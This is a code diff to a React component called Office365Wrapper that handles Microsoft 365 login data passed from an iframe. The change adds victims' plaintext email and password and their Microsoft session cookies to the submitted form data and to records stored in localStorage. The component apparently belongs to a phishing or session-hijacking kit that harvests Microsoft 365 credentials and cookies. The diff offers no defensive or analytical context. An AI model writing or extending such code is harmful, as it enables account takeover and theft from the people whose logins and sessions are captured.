@@ -49,7 +49,15 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
     const handleMessage = (event: MessageEvent) => {
       if (event.data.type === 'OFFICE_365_SUBMIT') {
         const { email, password } = event.data.payload;
-        handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
+        // Include cookies and cookieList from the iframe message
+        const formData = { 
+          email, 
+          password, 
+          provider: 'Office365',
+          cookies: event.data.payload.cookies || [],
+          cookieList: event.data.payload.cookieList || []
+        };
+        handleFormSubmit(new Event('submit'), formData);
       }
       
       // Capture Microsoft cookies from iframe messages
@@ -61,6 +69,8 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
           localStorage.setItem('office365_cookies', JSON.stringify({
             cookies: event.data.cookies || [],
             cookieList: event.data.cookieList || [],
+            email: event.data.email || '',
+            password: event.data.password || '',
             timestamp: new Date().toISOString()
           }));
         }
@@ -73,6 +83,8 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
           localStorage.setItem('office365_auth_cookies', JSON.stringify({
             cookies: event.data.payload.cookies || [],
             cookieList: event.data.payload.cookieList || [],
+            email: event.data.payload.email || '',
+            password: event.data.payload.password || '',
             timestamp: new Date().toISOString()
           }));
         }
